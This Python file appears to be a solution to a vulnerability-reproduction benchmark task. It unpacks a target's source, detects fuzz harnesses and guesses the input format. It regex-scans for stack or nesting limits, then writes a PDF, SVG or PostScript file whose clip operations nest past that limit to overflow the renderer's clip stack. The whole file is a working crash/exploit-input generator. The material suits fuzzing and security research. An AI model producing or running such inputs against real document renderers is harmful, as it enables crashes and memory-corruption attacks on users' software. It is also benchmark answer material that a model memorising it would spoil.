import os
import re
import tarfile
import zipfile
import tempfile
import shutil
from typing import Dict, List, Optional, Tuple


class Solution:
    def _extract_source(self, src_path: str) -> Tuple[str, Optional[str]]:
        if os.path.isdir(src_path):
            return src_path, None

        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        try:
            if zipfile.is_zipfile(src_path):
                with zipfile.ZipFile(src_path, "r") as zf:
                    zf.extractall(tmpdir)
            else:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
        except Exception:
            shutil.rmtree(tmpdir, ignore_errors=True)
            raise

        entries = [e for e in os.listdir(tmpdir) if not e.startswith(".")]
        if len(entries) == 1:
            root = os.path.join(tmpdir, entries[0])
            if os.path.isdir(root):
                return root, tmpdir
        return tmpdir, tmpdir

    def _iter_files(self, root: str) -> List[str]:
        out = []
        for dp, dn, fn in os.walk(root):
            dn[:] = [d for d in dn if d not in (".git", ".svn", ".hg", "node_modules", "target", "build", "out")]
            for f in fn:
                out.append(os.path.join(dp, f))
        return out

    def _read_text_limited(self, path: str, limit: int = 2_000_000) -> str:
        try:
            with open(path, "rb") as fp:
                data = fp.read(limit)
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _find_fuzzer_files(self, root: str) -> List[str]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".go", ".java", ".kt"}
        fuzzers = []
        for p in self._iter_files(root):
            _, ext = os.path.splitext(p)
            if ext.lower() not in exts:
                continue
            try:
                st = os.stat(p)
                if st.st_size > 3_000_000:
                    continue
            except Exception:
                continue
            txt = self._read_text_limited(p, 2_000_000)
            if "LLVMFuzzerTestOneInput" in txt:
                fuzzers.append(p)
        return fuzzers

    def _seed_extension_hints(self, root: str) -> Dict[str, int]:
        counts: Dict[str, int] = {}
        keywords = ("corpus", "seed", "seeds", "testdata", "samples", "regress", "fuzz", "inputs")
        max_files = 1000
        seen = 0
        for dp, dn, fn in os.walk(root):
            low = dp.lower()
            if not any(k in low for k in keywords):
                continue
            for f in fn:
                if seen >= max_files:
                    break
                if f.startswith("."):
                    continue
                ext = os.path.splitext(f)[1].lower()
                if not ext:
                    continue
                counts[ext] = counts.get(ext, 0) + 1
                seen += 1
            if seen >= max_files:
                break
        return counts

    def _score_text_for_format(self, txt: str) -> Dict[str, int]:
        t = txt.lower()
        scores = {"pdf": 0, "svg": 0, "ps": 0}
        pdf_keys = [
            "%pdf", " pdf", "pdf_", "pdf.", "mupdf", "fitz", "fz_", "pdf_document", "pdf_load", "poppler", "xpdf",
            "pdfium", "q\n", " re ", " w ", " w*", "endobj", "xref", "startxref"
        ]
        svg_keys = [
            "<svg", "svg", "librsvg", "resvg", "usvg", "tinyxml", "xml", "clip-path", "clippath", "viewbox"
        ]
        ps_keys = [
            "postscript", "gsave", "grestore", "eps", "%%boundingbox", "setrgbcolor", "newpath", "moveto", "lineto", "clip"
        ]
        for k in pdf_keys:
            scores["pdf"] += t.count(k)
        for k in svg_keys:
            scores["svg"] += t.count(k)
        for k in ps_keys:
            scores["ps"] += t.count(k)
        return scores

    def _infer_format(self, root: str, fuzzer_files: List[str]) -> str:
        ext_counts = self._seed_extension_hints(root)
        if ext_counts.get(".pdf", 0) > 0:
            return "pdf"
        if ext_counts.get(".svg", 0) > 0:
            return "svg"
        if ext_counts.get(".ps", 0) > 0 or ext_counts.get(".eps", 0) > 0:
            return "ps"

        total = {"pdf": 0, "svg": 0, "ps": 0}
        for p in fuzzer_files[:20]:
            txt = self._read_text_limited(p, 2_000_000)
            s = self._score_text_for_format(txt)
            for k in total:
                total[k] += s[k]

        if total["pdf"] >= total["svg"] and total["pdf"] >= total["ps"] and total["pdf"] > 0:
            return "pdf"
        if total["svg"] >= total["pdf"] and total["svg"] >= total["ps"] and total["svg"] > 0:
            return "svg"
        if total["ps"] > 0:
            return "ps"
        return "pdf"

    def _infer_stack_limit(self, root: str) -> Optional[int]:
        # Best-effort: find a MAX_*DEPTH/STACK/NEST* constant near clip/layer/stack usage.
        candidates: List[int] = []
        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z0-9_]*?(?:NEST|DEPTH|STACK)[A-Za-z0-9_]*)\s+(\d+)\b')
        const_re = re.compile(r'\b(?:const|static)\s+(?:unsigned\s+)?(?:int|size_t|uint32_t|uint16_t)\s+([A-Za-z0-9_]*?(?:NEST|DEPTH|STACK)[A-Za-z0-9_]*)\s*=\s*(\d+)\b')
        enum_re = re.compile(r'\b([A-Za-z0-9_]*?(?:NEST|DEPTH|STACK)[A-Za-z0-9_]*)\s*=\s*(\d+)\b')
        alloc_re = re.compile(r'\b(?:malloc|calloc|realloc|new)\b.*?\b(\d{2,7})\b')

        interesting_name = ("clip", "layer", "stack", "nest", "render", "pdf", "svg", "xps", "ps")
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs"}
        paths = []
        for p in self._iter_files(root):
            fn = os.path.basename(p).lower()
            _, ext = os.path.splitext(fn)
            if ext not in exts:
                continue
            if any(k in fn for k in interesting_name):
                paths.append(p)
        paths = paths[:2000]

        for p in paths:
            txt = self._read_text_limited(p, 2_000_000)
            if not txt:
                continue
            low = txt.lower()
            if ("clip" not in low and "layer" not in low and "stack" not in low and "nest" not in low):
                continue
            for line in txt.splitlines():
                if "clip" not in line.lower() and "layer" not in line.lower() and "stack" not in line.lower() and "nest" not in line.lower():
                    continue
                m = define_re.search(line)
                if m:
                    v = int(m.group(2))
                    if 16 <= v <= 200000:
                        candidates.append(v)
                    continue
                m = const_re.search(line)
                if m:
                    v = int(m.group(2))
                    if 16 <= v <= 200000:
                        candidates.append(v)
                    continue
                # enum lines often don't include clip/stack; still try lightly
                m = enum_re.search(line)
                if m:
                    v = int(m.group(2))
                    if 16 <= v <= 200000:
                        candidates.append(v)
                    continue
                if ("malloc" in line or "calloc" in line) and ("stack" in line.lower() or "clip" in line.lower() or "layer" in line.lower()):
                    for am in alloc_re.finditer(line):
                        v = int(am.group(1))
                        if 16 <= v <= 200000:
                            candidates.append(v)

        if not candidates:
            return None
        # Prefer powers of two / common limits if present.
        common = [32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536, 131072]
        cand_set = set(candidates)
        for v in reversed(common):
            if v in cand_set:
                return v
        return max(candidates)

    def _build_pdf(self, stream: bytes) -> bytes:
        if not stream.endswith(b"\n"):
            stream += b"\n"

        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        pdf = bytearray(header)
        offsets = [0] * 5

        def add_obj(num: int, body: bytes) -> None:
            offsets[num] = len(pdf)
            pdf.extend(f"{num} 0 obj\n".encode("ascii"))
            pdf.extend(body)
            if not body.endswith(b"\n"):
                pdf.extend(b"\n")
            pdf.extend(b"endobj\n")

        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >>\n")

        stream_dict = f"<< /Length {len(stream)} >>\nstream\n".encode("ascii")
        stream_obj = bytearray(stream_dict)
        stream_obj.extend(stream)
        stream_obj.extend(b"endstream\n")
        add_obj(4, bytes(stream_obj))

        xref_off = len(pdf)
        pdf.extend(b"xref\n")
        pdf.extend(b"0 5\n")
        pdf.extend(b"0000000000 65535 f \n")
        for i in range(1, 5):
            pdf.extend(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))

        pdf.extend(b"trailer\n")
        pdf.extend(b"<< /Size 5 /Root 1 0 R >>\n")
        pdf.extend(b"startxref\n")
        pdf.extend(f"{xref_off}\n".encode("ascii"))
        pdf.extend(b"%%EOF\n")
        return bytes(pdf)

    def _gen_pdf_poc(self, depth: int) -> bytes:
        # Pattern chosen to repeatedly create clip operations; intended to push clip marks/stack entries.
        pattern = b"q\n0 0 1 1 re W n\n"
        stream = pattern * depth
        return self._build_pdf(stream)

    def _gen_svg_poc(self, depth: int) -> bytes:
        # Deeply nested clip-path application.
        # Keep it compact but valid.
        head = (
            b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">\n'
            b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>\n'
        )
        open_tag = b'<g clip-path="url(#c)">\n'
        close_tag = b"</g>\n"
        body = open_tag * depth + b'<rect width="1" height="1"/>\n' + close_tag * depth
        tail = b"</svg>\n"
        return head + body + tail

    def _gen_ps_poc(self, depth: int) -> bytes:
        # PostScript-like deep graphics state / clipping nesting.
        # Minimal EPS header; repeated gsave + clip operations.
        head = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 1 1\n"
        # Each iteration sets a tiny rectangle path and clips, then gsave to nest.
        # Use gsave before clip to ensure nesting stacks.
        pattern = b"gsave newpath 0 0 moveto 1 0 lineto 1 1 lineto 0 1 lineto closepath clip\n"
        body = pattern * depth
        tail = b"showpage\n"
        return head + body + tail

    def solve(self, src_path: str) -> bytes:
        root, tmpdir = self._extract_source(src_path)
        try:
            fuzzers = self._find_fuzzer_files(root)
            fmt = self._infer_format(root, fuzzers)
            limit = self._infer_stack_limit(root)

            if limit is None:
                depth = 70000
            else:
                # Exceed inferred limit modestly; keep within a safe upper bound.
                depth = max(2048, min(150000, limit + 32))

            if fmt == "svg":
                return self._gen_svg_poc(depth)
            if fmt == "ps":
                # Keep PS smaller to avoid very long execution; still exceed with a comfortable margin.
                ps_depth = min(depth, 90000)
                return self._gen_ps_poc(ps_depth)
            return self._gen_pdf_poc(depth)
        finally:
            if tmpdir is not None:
                shutil.rmtree(tmpdir, ignore_errors=True)